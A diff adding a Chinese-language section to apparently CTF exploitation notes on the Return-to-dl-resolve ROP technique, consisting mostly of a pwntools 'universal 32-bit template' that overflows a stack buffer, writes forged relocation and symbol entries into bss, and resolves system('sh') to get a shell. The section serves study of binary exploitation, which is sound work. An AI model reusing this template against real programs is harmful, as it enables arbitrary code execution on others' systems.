@@ -169,3 +169,56 @@ p.sendline(payload)
 p.interactive()
 ```
 最后跑起来发现,完了,咋错了,然后又试了试,成功了.又,加上了sleep后就好了,以后这种连续send的一定加sleep呀~
+
+
+本篇文章用来记录 rop 最难也是最晦涩的知识点
+
+# Return-to-dl-resolve
+
+## 适用范围
+
+本方法仅需要一个 read 函数即可完成，同时 bss 端固定，可以在程序没有泄露函数时候大显身手
+
+## writeup （替换地址即可
+> 32 位通杀模板
+
+```
+from pwn import *
+p = process('./x86')
+context.log_level = 'debug'
+elf = ELF('./x86')
+gift = 0x0804A040#bss
+
+payload = 0x28*'a' + 4*'a'
+payload +=  p32(elf.plt['read']) + p32(0x0804840B)#fun_addr
+payload += p32(0) + p32(gift) + p32(17*4)
+
+p.sendline(payload)
+
+payload = ''
+payload += p32(0x0804a000) + p32(0x1e807)
+payload += p32(0)+p32(0x1e44)
+payload += p32(0) *4
+payload += 'system\x00\x00'
+payload += 'sh\x00'
+p.sendline(payload)
+payload = 0x28*'a' + 4*'a'
+payload += p32(0x080482D0) + p32(0x1da8) + p32(0xbeef) + p32(gift + 10*4)# system + rubbish + 'sh'
+p.sendline(payload)
+p.interactive()
+# 0x1da8 => $(objdump -s -j .rel.plt ./x86) - gift
+'''
+	0x0804a000	=> got
+	0x1e807-------  => [fake_addr - $(objdump -s -j .dynsym ./x86)]/0x10)<<8+7
+	0            |
+--- 0x1e44 <------  => fake_addr - (objdump -s -j .dynstr ./x86)
+|	0
+|	0
+|	0
+|	0
+--> syst
+	em\x00\x00
+	/bin/sh\x00
+'''
+```
+
